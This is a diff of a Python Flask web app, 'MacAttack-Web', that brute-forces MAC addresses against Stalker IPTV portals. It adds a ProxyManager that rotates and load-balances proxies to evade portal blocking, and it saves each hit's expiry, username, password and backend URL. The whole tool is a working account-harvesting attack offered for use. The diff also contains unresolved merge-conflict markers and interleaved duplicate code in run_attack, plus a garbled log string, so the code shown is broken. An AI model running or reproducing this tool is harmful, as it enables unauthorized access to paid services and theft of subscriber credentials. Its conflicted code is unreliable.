@@ -1,7 +1,7 @@
 """
 MacAttack-Web - Web-based MAC Address Testing Tool for Stalker Portals
 A Flask-based Linux/Docker version of MacAttack with Web UI
-Features: Multi-Portal Scanning, Proxy Error Tracking, SOCKS Support
+Features: Multi-Portal Scanning, Proxy Management, Quick Scan, Load Balancing
 """
 import os
 import json
@@ -56,7 +56,7 @@ logger.addHandler(consoleHandler)
 
 app = Flask(__name__)
 app.secret_key = secrets.token_urlsafe(32)
-app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max upload
+app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB max upload
 
 host = os.getenv("HOST", "0.0.0.0:5002")
 logger.info(f"Server will start on http://{host}")
@@ -95,16 +95,16 @@ atexit.register(shutdown_global_executor)
 attack_states = {}  # portal_id -> attack_state
 attack_states_lock = threading.Lock()
 
-# Proxy error tracking (like original MacAttack)
-proxy_error_counts = defaultdict(int)  # proxy -> error count
-proxy_error_connect_counts = defaultdict(int)  # proxy -> connection error count
-MAX_PROXY_ERRORS = 5  # Remove proxy after this many errors
+# Global proxy error tracking
+proxy_error_counts = defaultdict(int)
+MAX_PROXY_ERRORS = 5
 
 proxy_state = {
     "fetching": False,
     "testing": False,
     "proxies": [],
     "working_proxies": [],
+    "failed_proxies": [],
     "logs": []
 }
 
@@ -117,13 +117,17 @@ defaultSettings = {
     "mac_prefix": "00:1A:79:",
     "output_format": "mac_only",
     "auto_save": True,
-    "max_proxy_errors": 5,
+    "max_proxy_errors": 3,
     "proxy_test_threads": 50,
-    "unlimited_mac_retries": False,
+    "unlimited_mac_retries": True,
     "max_mac_retries": 3,
+<<<<<<< Updated upstream
     "session_max_retries": 0,  # NEW: Control requests retries (0 = disable)
     "session_connect_timeout": 5,  # NEW: Connect timeout
     "session_read_timeout": 10,  # NEW: Read timeout
+=======
+    "proxy_connections_per_portal": 5,  # Max concurrent connections per proxy per portal
+>>>>>>> Stashed changes
 }
 
 # Default proxy sources
@@ -138,36 +142,28 @@ DEFAULT_PROXY_SOURCES = [
 # ============== BASIC AUTH ==============
 
 def hash_password(password):
-    """Hash password with SHA256."""
     return hashlib.sha256(password.encode()).hexdigest()
 
 
 def check_auth(username, password):
-    """Check if username/password combination is valid."""
     auth = config.get("auth", {})
     if not auth.get("enabled", False):
         return True
-    
     stored_user = auth.get("username", "")
     stored_hash = auth.get("password_hash", "")
-    
     return username == stored_user and hash_password(password) == stored_hash
 
 
 def requires_auth(f):
-    """Decorator for routes that require authentication."""
     @wraps(f)
     def decorated(*args, **kwargs):
         auth = config.get("auth", {})
         if not auth.get("enabled", False):
             return f(*args, **kwargs)
-        
         request_auth = request.authorization
         if not request_auth or not check_auth(request_auth.username, request_auth.password):
-            return Response(
-                'Authentication required', 401,
-                {'WWW-Authenticate': 'Basic realm="MacAttack-Web"'}
-            )
+            return Response('Authentication required', 401,
+                {'WWW-Authenticate': 'Basic realm="MacAttack-Web"'})
         return f(*args, **kwargs)
     return decorated
 
@@ -190,6 +186,7 @@ def load_config():
     config.setdefault("proxies", [])
     config.setdefault("portals", [])
     config.setdefault("mac_list", [])
+    config.setdefault("mac_list_2", [])  # Second MAC list
     config.setdefault("proxy_sources", DEFAULT_PROXY_SOURCES.copy())
     config.setdefault("auth", {"enabled": False, "username": "", "password_hash": ""})
     
@@ -226,35 +223,6 @@ def add_log(state, message, level="info"):
         state["logs"] = state["logs"][-500:]
 
 
-def get_working_proxy():
-    """Get a working proxy, respecting error counts like original MacAttack."""
-    global proxy_error_counts
-    proxies = config.get("proxies", [])
-    if not proxies:
-        return None
-    
-    max_errors = get_settings().get("max_proxy_errors", MAX_PROXY_ERRORS)
-    
-    # Filter out proxies with too many errors
-    working = [p for p in proxies if proxy_error_counts[p] < max_errors]
-    
-    if not working:
-        # Reset error counts if all proxies are exhausted
-        proxy_error_counts.clear()
-        working = proxies
-    
-    return random.choice(working) if working else None
-
-
-def mark_proxy_error(proxy, is_connection_error=False):
-    """Mark a proxy as having an error - like original MacAttack."""
-    global proxy_error_counts, proxy_error_connect_counts
-    if proxy:
-        proxy_error_counts[proxy] += 1
-        if is_connection_error:
-            proxy_error_connect_counts[proxy] += 1
-
-
 @contextmanager
 def no_proxy_environment():
     original_http = os.environ.get("http_proxy")
@@ -272,12 +240,12 @@ def no_proxy_environment():
             os.environ["https_proxy"] = original_https
 
 
+
 # ============== ROUTES ==============
 
 @app.route("/")
 @requires_auth
 def index():
-    # Check if auth needs to be set up
     auth = config.get("auth", {})
     if not auth.get("enabled", False) and not auth.get("setup_skipped", False):
         return render_template("setup.html", version=VERSION)
@@ -286,10 +254,7 @@ def index():
 
 @app.route("/setup", methods=["GET", "POST"])
 def setup():
-    """Initial setup page for creating admin credentials."""
     auth = config.get("auth", {})
-    
-    # If already set up, redirect to main page
     if auth.get("enabled", False):
         return Response("Already configured", 302, {"Location": "/"})
     
@@ -302,7 +267,6 @@ def setup():
         if skip:
             config["auth"] = {"enabled": False, "setup_skipped": True}
             save_config()
-            logger.info("Auth setup skipped - no authentication enabled")
             return jsonify({"success": True, "message": "Setup skipped"})
         
         if not username or not password:
@@ -317,7 +281,6 @@ def setup():
             "password_hash": hash_password(password)
         }
         save_config()
-        logger.info(f"Auth configured for user: {username}")
         return jsonify({"success": True, "message": "Authentication configured"})
     
     return render_template("setup.html", version=VERSION)
@@ -325,7 +288,6 @@ def setup():
 
 @app.route("/api/auth/status")
 def api_auth_status():
-    """Check authentication status."""
     auth = config.get("auth", {})
     return jsonify({
         "enabled": auth.get("enabled", False),
@@ -336,7 +298,6 @@ def api_auth_status():
 @app.route("/api/auth/change", methods=["POST"])
 @requires_auth
 def api_auth_change():
-    """Change password or disable auth."""
     data = request.json
     action = data.get("action", "")
     
@@ -433,8 +394,15 @@ def api_portal_manage(portal_id):
 @app.route("/api/maclist", methods=["GET", "POST", "DELETE"])
 @requires_auth
 def api_maclist():
+    list_id = request.args.get("list", "1")  # Support list 1 or 2
+    list_key = "mac_list" if list_id == "1" else "mac_list_2"
+    
     if request.method == "GET":
-        return jsonify({"macs": config.get("mac_list", []), "count": len(config.get("mac_list", []))})
+        return jsonify({
+            "macs": config.get(list_key, []), 
+            "count": len(config.get(list_key, [])),
+            "list_id": list_id
+        })
     
     if request.method == "POST":
         data = request.json
@@ -446,14 +414,14 @@ def api_maclist():
                 mac = mac.replace("-", ":").replace(".", ":")
                 if mac not in macs:
                     macs.append(mac)
-        config["mac_list"] = macs
+        config[list_key] = macs
         save_config()
-        return jsonify({"success": True, "count": len(macs)})
+        return jsonify({"success": True, "count": len(macs), "list_id": list_id})
     
     if request.method == "DELETE":
-        config["mac_list"] = []
+        config[list_key] = []
         save_config()
-        return jsonify({"success": True})
+        return jsonify({"success": True, "list_id": list_id})
 
 
 @app.route("/api/maclist/import", methods=["POST"])
@@ -464,23 +432,22 @@ def api_maclist_import():
     
     file = request.files["file"]
     append_mode = request.form.get("append", "true").lower() == "true"
+    list_id = request.form.get("list", "1")
+    list_key = "mac_list" if list_id == "1" else "mac_list_2"
     
-    # Read file content
     content = file.read().decode("utf-8", errors="ignore")
     lines = content.strip().split("\n")
     total_lines = len(lines)
     
-    logger.info(f"Processing {total_lines} lines from MAC import (append={append_mode})...")
+    logger.info(f"Processing {total_lines} lines from MAC import (list={list_id}, append={append_mode})...")
     
-    # Start with existing MACs if append mode
     if append_mode:
-        existing_macs = set(config.get("mac_list", []))
+        existing_macs = set(config.get(list_key, []))
         existing_count = len(existing_macs)
     else:
         existing_macs = set()
         existing_count = 0
     
-    # Use set for O(1) duplicate checking
     new_macs = set()
     invalid = 0
     
@@ -488,7 +455,6 @@ def api_maclist_import():
         mac = line.strip().upper()
         if mac and len(mac) >= 11:
             mac = mac.replace("-", ":").replace(".", ":")
-            # Basic MAC format validation
             if len(mac) == 17 and mac.count(':') == 5:
                 if mac not in existing_macs:
                     new_macs.add(mac)
@@ -497,11 +463,10 @@ def api_maclist_import():
         elif mac:
             invalid += 1
     
-    # Combine existing and new
     all_macs = list(existing_macs | new_macs)
     duplicates = total_lines - len(new_macs) - invalid
     
-    config["mac_list"] = all_macs
+    config[list_key] = all_macs
     save_config()
     
     logger.info(f"MAC import complete: {len(new_macs)} new MACs added, {len(all_macs)} total")
@@ -513,18 +478,154 @@ def api_maclist_import():
         "existing_count": existing_count,
         "total_lines": total_lines,
         "duplicates": max(0, duplicates),
-        "invalid": invalid
+        "invalid": invalid,
+        "list_id": list_id
     })
+
 
 
 # ============== MULTI-PORTAL ATTACK ==============
 
-def create_attack_state(portal_id, portal_url, mode="random"):
+class ProxyManager:
+    """Per-portal proxy management with load balancing and state tracking."""
+    
+    def __init__(self, proxies, max_errors=3, max_connections_per_proxy=5):
+        self.all_proxies = list(proxies) if proxies else []
+        self.max_errors = max_errors
+        self.max_connections = max_connections_per_proxy
+        
+        # Per-proxy state
+        self.error_counts = defaultdict(int)  # proxy -> error count
+        self.blocked_proxies = set()  # Proxies blocked by portal
+        self.dead_proxies = set()  # Proxies that are completely dead
+        self.disabled_proxies = set()  # Proxies disabled due to errors
+        self.connection_counts = defaultdict(int)  # proxy -> current connections
+        
+        # Round-robin index for load balancing
+        self.current_index = 0
+        self.lock = threading.Lock()
+    
+    def get_stats(self):
+        """Get proxy statistics."""
+        with self.lock:
+            active = len([p for p in self.all_proxies 
+                         if p not in self.disabled_proxies 
+                         and p not in self.blocked_proxies 
+                         and p not in self.dead_proxies])
+            return {
+                "total": len(self.all_proxies),
+                "active": active,
+                "blocked": len(self.blocked_proxies),
+                "dead": len(self.dead_proxies),
+                "disabled": len(self.disabled_proxies),
+            }
+    
+    def get_working_proxies(self):
+        """Get list of currently working proxies."""
+        with self.lock:
+            return [p for p in self.all_proxies 
+                    if p not in self.disabled_proxies 
+                    and p not in self.blocked_proxies 
+                    and p not in self.dead_proxies]
+    
+    def get_next_proxy(self):
+        """Get next proxy using round-robin load balancing."""
+        with self.lock:
+            working = self.get_working_proxies()
+            if not working:
+                return None
+            
+            # Find proxy with lowest connection count
+            min_connections = float('inf')
+            best_proxy = None
+            
+            for i in range(len(working)):
+                idx = (self.current_index + i) % len(working)
+                proxy = working[idx]
+                conn_count = self.connection_counts[proxy]
+                
+                if conn_count < self.max_connections and conn_count < min_connections:
+                    min_connections = conn_count
+                    best_proxy = proxy
+                    self.current_index = (idx + 1) % len(working)
+                    break
+            
+            if best_proxy:
+                self.connection_counts[best_proxy] += 1
+            
+            return best_proxy
+    
+    def release_proxy(self, proxy):
+        """Release a proxy connection."""
+        with self.lock:
+            if proxy and self.connection_counts[proxy] > 0:
+                self.connection_counts[proxy] -= 1
+    
+    def mark_error(self, proxy, is_blocked=False, is_dead=False):
+        """Mark proxy error and potentially disable it."""
+        with self.lock:
+            if not proxy:
+                return
+            
+            if is_dead:
+                self.dead_proxies.add(proxy)
+                self.disabled_proxies.add(proxy)
+                return "dead"
+            
+            if is_blocked:
+                self.blocked_proxies.add(proxy)
+                self.disabled_proxies.add(proxy)
+                return "blocked"
+            
+            self.error_counts[proxy] += 1
+            if self.error_counts[proxy] >= self.max_errors:
+                self.disabled_proxies.add(proxy)
+                return "disabled"
+            
+            return "error"
+    
+    def mark_success(self, proxy):
+        """Mark successful proxy use - reduce error count."""
+        with self.lock:
+            if proxy and self.error_counts[proxy] > 0:
+                self.error_counts[proxy] = max(0, self.error_counts[proxy] - 1)
+    
+    def reset(self):
+        """Reset all proxy states (for resume)."""
+        with self.lock:
+            self.error_counts.clear()
+            self.blocked_proxies.clear()
+            self.dead_proxies.clear()
+            self.disabled_proxies.clear()
+            self.connection_counts.clear()
+            self.current_index = 0
+    
+    def reload_proxies(self, new_proxies):
+        """Reload proxy list (keeps state for existing proxies)."""
+        with self.lock:
+            # Add new proxies
+            new_set = set(new_proxies)
+            old_set = set(self.all_proxies)
+            
+            # Add new proxies
+            for p in new_set - old_set:
+                self.all_proxies.append(p)
+            
+            # Remove proxies that are no longer in list
+            self.all_proxies = [p for p in self.all_proxies if p in new_set]
+    
+    def has_working_proxies(self):
+        """Check if any working proxies are available."""
+        return len(self.get_working_proxies()) > 0
+
+
+def create_attack_state(portal_id, portal_url, mode="random", mac_list_id="1"):
     """Create a new attack state for a portal."""
     return {
         "id": portal_id,
         "running": True,
         "paused": False,
+        "stopped": False,  # Explicitly stopped (can resume)
         "tested": 0,
         "hits": 0,
         "errors": 0,
@@ -535,31 +636,35 @@ def create_attack_state(portal_id, portal_url, mode="random"):
         "start_time": time.time(),
         "portal_url": portal_url,
         "mode": mode,
+        "mac_list_id": mac_list_id,
         "mac_list_index": 0,
-        "mac_list_total": len(config.get("mac_list", [])) if mode == "list" else 0
+        "mac_list_total": 0,
+        "scanned_macs": set(),  # Track scanned MACs for random mode
+        "proxy_stats": {"total": 0, "active": 0, "blocked": 0, "dead": 0, "disabled": 0},
+        "auto_paused": False,  # Paused due to no proxies
     }
 
 
 @app.route("/api/attack/start", methods=["POST"])
 @requires_auth
 def api_attack_start():
-    """Start attack on one or multiple portals."""
     data = request.json
-    portal_urls = data.get("urls", [])  # List of URLs for multi-portal
-    single_url = data.get("url", "").strip()  # Single URL (backward compatible)
+    portal_urls = data.get("urls", [])
+    single_url = data.get("url", "").strip()
     mode = data.get("mode", "random")
+    mac_list_id = data.get("mac_list", "1")  # Which MAC list to use
     
-    # Handle single URL
     if single_url and not portal_urls:
         portal_urls = [single_url]
     
     if not portal_urls:
         return jsonify({"success": False, "error": "Portal URL(s) required"})
     
-    if mode == "list" and not config.get("mac_list"):
-        return jsonify({"success": False, "error": "MAC list is empty"})
+    list_key = "mac_list" if mac_list_id == "1" else "mac_list_2"
     
-    # For refresh mode, check if there are found MACs for the portal(s)
+    if mode == "list" and not config.get(list_key):
+        return jsonify({"success": False, "error": f"MAC list {mac_list_id} is empty"})
+    
     if mode == "refresh":
         found_macs = config.get("found_macs", [])
         if not found_macs:
@@ -570,7 +675,6 @@ def api_attack_start():
         if not url.startswith("http"):
             url = f"http://{url}"
         
-        # Auto-detect portal endpoint if user only provided base URL
         detected_url, portal_type, version = stb.auto_detect_portal_url(url)
         if detected_url:
             url = detected_url
@@ -579,7 +683,7 @@ def api_attack_start():
         portal_id = secrets.token_hex(4)
         
         with attack_states_lock:
-            attack_states[portal_id] = create_attack_state(portal_id, url, mode)
+            attack_states[portal_id] = create_attack_state(portal_id, url, mode, mac_list_id)
         
         add_log(attack_states[portal_id], f"Starting attack on {url}", "info")
         
@@ -594,18 +698,19 @@ def api_attack_start():
 @app.route("/api/attack/stop", methods=["POST"])
 @requires_auth
 def api_attack_stop():
-    """Stop attack(s)."""
     data = request.json
-    portal_id = data.get("id")  # Specific portal or None for all
+    portal_id = data.get("id")
     
     with attack_states_lock:
         if portal_id:
             if portal_id in attack_states:
                 attack_states[portal_id]["running"] = False
+                attack_states[portal_id]["stopped"] = True
                 add_log(attack_states[portal_id], "Attack stopped", "warning")
         else:
             for state in attack_states.values():
                 state["running"] = False
+                state["stopped"] = True
                 add_log(state, "Attack stopped", "warning")
     
     return jsonify({"success": True})
@@ -619,18 +724,46 @@ def api_attack_pause():
     
     with attack_states_lock:
         if portal_id and portal_id in attack_states:
-            attack_states[portal_id]["paused"] = not attack_states[portal_id]["paused"]
-            status = "paused" if attack_states[portal_id]["paused"] else "resumed"
-            add_log(attack_states[portal_id], f"Attack {status}", "info")
-            return jsonify({"success": True, "paused": attack_states[portal_id]["paused"]})
+            state = attack_states[portal_id]
+            state["paused"] = not state["paused"]
+            state["auto_paused"] = False  # Clear auto-pause flag
+            status = "paused" if state["paused"] else "resumed"
+            add_log(state, f"Attack {status}", "info")
+            return jsonify({"success": True, "paused": state["paused"]})
     
     return jsonify({"success": False})
+
+
+@app.route("/api/attack/resume", methods=["POST"])
+@requires_auth
+def api_attack_resume():
+    """Resume a stopped attack with fresh proxy state."""
+    data = request.json
+    portal_id = data.get("id")
+    
+    with attack_states_lock:
+        if portal_id and portal_id in attack_states:
+            state = attack_states[portal_id]
+            if state.get("stopped") or not state.get("running"):
+                # Restart the attack
+                state["running"] = True
+                state["stopped"] = False
+                state["paused"] = False
+                state["auto_paused"] = False
+                add_log(state, "Attack resumed with fresh proxy state", "info")
+                
+                # Start new thread
+                thread = threading.Thread(target=run_attack, args=(portal_id,), daemon=True)
+                thread.start()
+                
+                return jsonify({"success": True})
+    
+    return jsonify({"success": False, "error": "Attack not found or already running"})
 
 
 @app.route("/api/attack/status")
 @requires_auth
 def api_attack_status():
-    """Get status of all running attacks."""
     portal_id = request.args.get("id")
     
     with attack_states_lock:
@@ -642,6 +775,8 @@ def api_attack_status():
                     "id": portal_id,
                     "running": state.get("running", False),
                     "paused": state.get("paused", False),
+                    "stopped": state.get("stopped", False),
+                    "auto_paused": state.get("auto_paused", False),
                     "tested": state.get("tested", 0),
                     "hits": state.get("hits", 0),
                     "errors": state.get("errors", 0),
@@ -651,12 +786,13 @@ def api_attack_status():
                     "logs": state.get("logs", [])[-100:],
                     "elapsed": elapsed,
                     "mode": state.get("mode", "random"),
+                    "mac_list_id": state.get("mac_list_id", "1"),
                     "mac_list_index": state.get("mac_list_index", 0),
                     "mac_list_total": state.get("mac_list_total", 0),
-                    "portal_url": state.get("portal_url", "")
+                    "portal_url": state.get("portal_url", ""),
+                    "proxy_stats": state.get("proxy_stats", {}),
                 })
         
-        # Return all attacks
         all_attacks = []
         for pid, state in attack_states.items():
             elapsed = int(time.time() - state.get("start_time", time.time()))
@@ -664,6 +800,8 @@ def api_attack_status():
                 "id": pid,
                 "running": state.get("running", False),
                 "paused": state.get("paused", False),
+                "stopped": state.get("stopped", False),
+                "auto_paused": state.get("auto_paused", False),
                 "tested": state.get("tested", 0),
                 "hits": state.get("hits", 0),
                 "errors": state.get("errors", 0),
@@ -674,8 +812,10 @@ def api_attack_status():
                 "elapsed": elapsed,
                 "portal_url": state.get("portal_url", ""),
                 "mode": state.get("mode", "random"),
+                "mac_list_id": state.get("mac_list_id", "1"),
                 "mac_list_index": state.get("mac_list_index", 0),
-                "mac_list_total": state.get("mac_list_total", 0)
+                "mac_list_total": state.get("mac_list_total", 0),
+                "proxy_stats": state.get("proxy_stats", {}),
             })
         
         return jsonify({"attacks": all_attacks})
@@ -684,7 +824,6 @@ def api_attack_status():
 @app.route("/api/attack/clear", methods=["POST"])
 @requires_auth
 def api_attack_clear():
-    """Clear finished attacks from list."""
     with attack_states_lock:
         finished = [pid for pid, state in attack_states.items() if not state.get("running")]
         for pid in finished:
@@ -692,7 +831,9 @@ def api_attack_clear():
     return jsonify({"success": True, "cleared": len(finished)})
 
 
+
 def run_attack(portal_id):
+<<<<<<< Updated upstream
     """
     Optimized MAC attack with:
     - Global executor (no shutdown)
@@ -700,6 +841,9 @@ def run_attack(portal_id):
     - Configurable retries & timeouts
     """
     global proxy_error_counts
+=======
+    """Run the MAC attack for a specific portal with improved proxy handling."""
+>>>>>>> Stashed changes
     
     with attack_states_lock:
         if portal_id not in attack_states:
@@ -707,24 +851,41 @@ def run_attack(portal_id):
         state = attack_states[portal_id]
     
     portal_url = state["portal_url"]
-    settings = get_settings()
+    mode = state.get("mode", "random")
+    mac_list_id = state.get("mac_list_id", "1")
+    
+    # Get settings (will be reloaded each iteration for dynamic changes)
+    def get_current_settings():
+        return get_settings()
+    
+    settings = get_current_settings()
     speed = settings.get("speed", 10)
     timeout = settings.get("timeout", 10)
     use_proxies = settings.get("use_proxies", False)
     mac_prefix = settings.get("mac_prefix", "00:1A:79:")
-    mode = state.get("mode", "random")
-    max_proxy_errors = settings.get("max_proxy_errors", MAX_PROXY_ERRORS)
-    unlimited_mac_retries = settings.get("unlimited_mac_retries", False)
+    max_proxy_errors = settings.get("max_proxy_errors", 3)
+    unlimited_mac_retries = settings.get("unlimited_mac_retries", True)
     max_mac_retries = settings.get("max_mac_retries", 3)
+    proxy_connections = settings.get("proxy_connections_per_portal", 5)
     
+<<<<<<< Updated upstream
     # Use GLOBAL executor - NEVER call shutdown()!
     executor = get_global_executor(max_workers=100)
     
     proxy_index = 0
     
     # Build MAC list
+=======
+    # Initialize proxy manager
+    initial_proxies = config.get("proxies", []) if use_proxies else []
+    proxy_manager = ProxyManager(initial_proxies, max_proxy_errors, proxy_connections)
+    
+    # Build MAC list based on mode
+    list_key = "mac_list" if mac_list_id == "1" else "mac_list_2"
+    
+>>>>>>> Stashed changes
     if mode == "list":
-        mac_list = config.get("mac_list", [])
+        mac_list = list(config.get(list_key, []))
     elif mode == "refresh":
         found_macs = config.get("found_macs", [])
         portal_normalized = portal_url.rstrip('/').lower()
@@ -737,6 +898,7 @@ def run_attack(portal_id):
     else:
         mac_list = []
     
+<<<<<<< Updated upstream
     mac_list_index = 0
     mac_retry_counts = defaultdict(int)
     retry_queue = []
@@ -798,6 +960,115 @@ def run_attack(portal_id):
                     is_retry = True
                 elif mode in ("list", "refresh"):
                     if mac_list_index >= len(mac_list):
+=======
+    mac_list_index = state.get("mac_list_index", 0)  # Resume from last position
+    state["mac_list_total"] = len(mac_list) if mode in ("list", "refresh") else 0
+    
+    # Track retry counts per MAC
+    mac_retry_counts = defaultdict(int)
+    retry_queue = []
+    
+    # Log startup info
+    add_log(state, f"Attack started with {speed} threads, mode: {mode}", "info")
+    if use_proxies:
+        stats = proxy_manager.get_stats()
+        add_log(state, f"Using {stats['total']} proxies (max {proxy_connections} connections each)", "info")
+        state["proxy_stats"] = stats
+    
+    if unlimited_mac_retries:
+        add_log(state, "Unlimited MAC retries enabled", "info")
+    else:
+        add_log(state, f"Max {max_mac_retries} retries per MAC", "info")
+    
+    if mode == "list":
+        add_log(state, f"MAC list {mac_list_id} has {len(mac_list)} entries", "info")
+    elif mode == "refresh":
+        add_log(state, f"Refreshing {len(mac_list)} found MACs", "info")
+    else:
+        add_log(state, f"Random mode with prefix: {mac_prefix}", "info")
+    
+    with ThreadPoolExecutor(max_workers=speed) as executor:
+        futures = {}
+        list_exhausted = False
+        last_settings_check = time.time()
+        
+        while state["running"]:
+            # Handle pause
+            while state["paused"] and state["running"]:
+                time.sleep(0.5)
+                # Check if proxies were added during pause
+                if use_proxies:
+                    new_proxies = config.get("proxies", [])
+                    proxy_manager.reload_proxies(new_proxies)
+                    if state.get("auto_paused") and proxy_manager.has_working_proxies():
+                        state["paused"] = False
+                        state["auto_paused"] = False
+                        add_log(state, "Resuming - new proxies available", "info")
+            
+            if not state["running"]:
+                break
+            
+            # Reload settings periodically (every 5 seconds)
+            if time.time() - last_settings_check > 5:
+                settings = get_current_settings()
+                timeout = settings.get("timeout", 10)
+                max_proxy_errors = settings.get("max_proxy_errors", 3)
+                unlimited_mac_retries = settings.get("unlimited_mac_retries", True)
+                max_mac_retries = settings.get("max_mac_retries", 3)
+                last_settings_check = time.time()
+                
+                # Reload proxies
+                if use_proxies:
+                    new_proxies = config.get("proxies", [])
+                    proxy_manager.reload_proxies(new_proxies)
+            
+            # Update proxy stats
+            if use_proxies:
+                state["proxy_stats"] = proxy_manager.get_stats()
+            
+            # Check if list exhausted
+            if mode in ("list", "refresh") and mac_list_index >= len(mac_list) and not retry_queue:
+                if not list_exhausted:
+                    add_log(state, f"MAC list exhausted ({mac_list_index} submitted). Waiting for results...", "info")
+                    list_exhausted = True
+                if not futures:
+                    break
+            
+            # Check if all proxies exhausted
+            if use_proxies and not proxy_manager.has_working_proxies() and not state["auto_paused"]:
+                add_log(state, "⚠ All proxies exhausted! Auto-pausing. Add proxies and resume.", "warning")
+                state["paused"] = True
+                state["auto_paused"] = True
+                continue
+            
+            # Add new MACs to test
+            if not list_exhausted or retry_queue:
+                while len(futures) < speed and state["running"]:
+                    mac = None
+                    is_retry = False
+                    
+                    # First check retry queue
+                    if retry_queue:
+                        mac = retry_queue.pop(0)
+                        is_retry = True
+                    elif mode in ("list", "refresh"):
+                        if mac_list_index >= len(mac_list):
+                            break
+                        mac = mac_list[mac_list_index]
+                        mac_list_index += 1
+                        state["mac_list_index"] = mac_list_index
+                    else:
+                        # Random mode - generate new MAC
+                        mac = generate_mac(mac_prefix)
+                        # Skip if already scanned in this session
+                        attempts = 0
+                        while mac in state["scanned_macs"] and attempts < 100:
+                            mac = generate_mac(mac_prefix)
+                            attempts += 1
+                        state["scanned_macs"].add(mac)
+                    
+                    if not mac:
+>>>>>>> Stashed changes
                         break
                     mac = mac_list[mac_list_index]
                     mac_list_index += 1
@@ -842,6 +1113,7 @@ def run_attack(portal_id):
                 if success:
                     state["hits"] += 1
                     
+<<<<<<< Updated upstream
                     expiry = result.get("expiry", "Unknown")
                     channels = result.get("channels", 0)
                     genres = result.get("genres", [])
@@ -958,18 +1230,177 @@ def run_attack(portal_id):
         failed_proxies = [p for p in proxies if proxy_error_counts.get(p, 0) >= max_proxy_errors]
         if failed_proxies:
             add_log(state, f"Ã¢Å¡  {len(failed_proxies)} proxies disabled", "warning")
+=======
+                    # Get proxy
+                    proxy = None
+                    if use_proxies:
+                        proxy = proxy_manager.get_next_proxy()
+                        if not proxy and not state["auto_paused"]:
+                            # No proxy available, queue MAC for retry
+                            if mac not in retry_queue:
+                                retry_queue.append(mac)
+                            break
+                        state["current_proxy"] = proxy or ""
+                    
+                    state["current_mac"] = mac
+                    
+                    future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
+                    futures[future] = (mac, proxy, is_retry)
+            
+            # Process completed futures
+            done_futures = [f for f in futures if f.done()]
+            
+            for future in done_futures:
+                mac, proxy, is_retry = futures.pop(future)
+                
+                # Release proxy connection
+                if proxy:
+                    proxy_manager.release_proxy(proxy)
+                
+                try:
+                    success, result = future.result()
+                    state["tested"] += 1
+                    state["current_mac"] = mac
+                    
+                    proxy_info = f" via {proxy}" if proxy else ""
+                    
+                    if success:
+                        state["hits"] += 1
+                        
+                        # Mark proxy success
+                        if proxy:
+                            proxy_manager.mark_success(proxy)
+                        
+                        expiry = result.get("expiry", "Unknown")
+                        channels = result.get("channels", 0)
+                        genres = result.get("genres", [])
+                        
+                        # Check for DE channels
+                        de_channels = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
+                        has_de = len(de_channels) > 0
+                        
+                        state["found_macs"].append({
+                            "mac": mac,
+                            "expiry": expiry,
+                            "channels": channels,
+                            "has_de": has_de,
+                            "time": datetime.now().strftime("%H:%M:%S")
+                        })
+                        
+                        de_info = " 🇩🇪" if has_de else ""
+                        add_log(state, f"🎯 HIT! {mac} - Expiry: {expiry} - Channels: {channels}{de_info}{proxy_info}", "success")
+                        
+                        # Save to config
+                        found_entry = {
+                            "mac": mac,
+                            "expiry": expiry,
+                            "portal": portal_url,
+                            "channels": channels,
+                            "genres": genres,
+                            "has_de": has_de,
+                            "de_genres": de_channels,
+                            "vod_categories": result.get("vod_categories", []),
+                            "series_categories": result.get("series_categories", []),
+                            "backend_url": result.get("backend_url"),
+                            "username": result.get("username"),
+                            "password": result.get("password"),
+                            "max_connections": result.get("max_connections"),
+                            "created_at": result.get("created_at"),
+                            "client_ip": result.get("client_ip"),
+                            "found_at": datetime.now().isoformat()
+                        }
+                        
+                        # Update or add
+                        existing_idx = None
+                        for idx, existing in enumerate(config["found_macs"]):
+                            if existing.get("mac") == mac and existing.get("portal") == portal_url:
+                                existing_idx = idx
+                                break
+                        
+                        if existing_idx is not None:
+                            config["found_macs"][existing_idx] = found_entry
+                        else:
+                            config["found_macs"].append(found_entry)
+                        
+                        if settings.get("auto_save", True):
+                            save_config()
+                        
+                        # Clear retry count
+                        mac_retry_counts.pop(mac, None)
+                    else:
+                        add_log(state, f"✗ {mac} - No valid account{proxy_info}", "info")
+                        mac_retry_counts.pop(mac, None)
+                
+                except (stb.ProxyDeadError, stb.PortalBlockedError, stb.ProxyError) as e:
+                    error_type = type(e).__name__
+                    proxy_info = f" via {proxy}" if proxy else ""
+                    
+                    # Classify and handle proxy error
+                    if isinstance(e, stb.ProxyDeadError):
+                        status = proxy_manager.mark_error(proxy, is_dead=True)
+                        add_log(state, f"💀 Proxy dead: {proxy}", "error")
+                    elif isinstance(e, stb.PortalBlockedError):
+                        status = proxy_manager.mark_error(proxy, is_blocked=True)
+                        add_log(state, f"🚫 Proxy blocked by portal: {proxy}", "error")
+                    else:
+                        status = proxy_manager.mark_error(proxy)
+                        error_count = proxy_manager.error_counts.get(proxy, 0)
+                        add_log(state, f"⚠ Proxy error ({error_count}/{max_proxy_errors}): {proxy}", "warning")
+                    
+                    # Retry MAC with different proxy
+                    mac_retry_counts[mac] += 1
+                    
+                    if unlimited_mac_retries:
+                        if proxy_manager.has_working_proxies():
+                            retry_queue.append(mac)
+                            add_log(state, f"🔄 Queuing {mac} for retry (attempt {mac_retry_counts[mac]})", "info")
+                        else:
+                            state["errors"] += 1
+                            add_log(state, f"✗ {mac} - All proxies exhausted", "error")
+                            mac_retry_counts.pop(mac, None)
+                    else:
+                        if mac_retry_counts[mac] < max_mac_retries:
+                            retry_queue.append(mac)
+                            add_log(state, f"🔄 Queuing {mac} for retry ({mac_retry_counts[mac]}/{max_mac_retries})", "info")
+                        else:
+                            state["errors"] += 1
+                            add_log(state, f"✗ {mac} - Max retries reached", "error")
+                            mac_retry_counts.pop(mac, None)
+                
+                except Exception as e:
+                    state["errors"] += 1
+                    proxy_info = f" via {proxy}" if proxy else ""
+                    add_log(state, f"✗ Error: {mac} - {str(e)[:50]}{proxy_info}", "error")
+                    mac_retry_counts.pop(mac, None)
+            
+            time.sleep(0.05)
+    
+    state["running"] = False
+    
+    # Final stats
+    if use_proxies:
+        stats = proxy_manager.get_stats()
+        state["proxy_stats"] = stats
+        add_log(state, f"Proxy stats: {stats['active']} active, {stats['blocked']} blocked, {stats['dead']} dead, {stats['disabled']} disabled", "info")
+>>>>>>> Stashed changes
     
